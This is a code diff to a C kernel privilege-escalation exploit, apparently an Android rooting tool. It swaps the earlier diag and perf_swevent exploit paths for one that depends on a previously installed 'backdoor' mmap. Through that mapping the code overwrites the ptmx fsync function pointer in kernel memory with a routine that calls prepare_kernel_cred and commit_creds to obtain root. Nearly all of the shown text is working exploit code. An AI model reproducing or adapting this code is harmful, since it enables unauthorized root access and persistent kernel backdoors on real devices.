@@ -12,10 +12,8 @@
 #include <fcntl.h>
 
 #include "cred.h"
-#include "mm.h"
-#include "perf_swevent.h"
 #include "ptmx.h"
-#include "libdiagexploit/diag.h"
+#include "backdoor_mmap.h"
 
 void
 obtain_root_privilege(void)
@@ -36,49 +34,37 @@ run_obtain_root_privilege(void *user_data)
 }
 
 static bool
-attempt_diag_exploit(unsigned long int address)
-{
-  struct diag_values injection_data;
-
-  injection_data.address = address;
-  injection_data.value = (uint16_t)&obtain_root_privilege;
-
-  return diag_run_exploit(&injection_data, 1,
-                          run_obtain_root_privilege, NULL);
-}
-
-static bool
 run_exploit(void)
 {
-  unsigned long int ptmx_fsync_address;
+  void **ptmx_fsync_address;
   unsigned long int ptmx_fops_address;
+  int fd;
+  bool ret;
 
   ptmx_fops_address = get_ptmx_fops_address();
   if (!ptmx_fops_address) {
     return false;
   }
 
-  ptmx_fsync_address = ptmx_fops_address + 0x38;
+  if (!backdoor_open_mmap()) {
+    printf("Failed to mmap due to %s.\n", strerror(errno));
+    printf("Run 'install_backdoor' first\n");
 
-  if (attempt_diag_exploit(ptmx_fsync_address)) {
-    return true;
+    return false;
   }
 
-  printf("\nAttempt perf_swevent exploit...\n");
-  return perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
-                                  run_obtain_root_privilege, NULL);
+  ptmx_fsync_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x38);
+  *ptmx_fsync_address = obtain_root_privilege;
+
+  ret = run_obtain_root_privilege(NULL);
+
+  backdoor_close_mmap();
+  return ret;
 }
 
 int
 main(int argc, char **argv)
 {
-  set_kernel_phys_offset(0x200000);
-  remap_pfn_range = get_remap_pfn_range_address();
-  if (!remap_pfn_range) {
-    printf("You need to manage to get remap_pfn_range addresses.\n");
-    exit(EXIT_FAILURE);
-  }
-
   if (!setup_creds_functions()) {
     printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
     exit(EXIT_FAILURE);
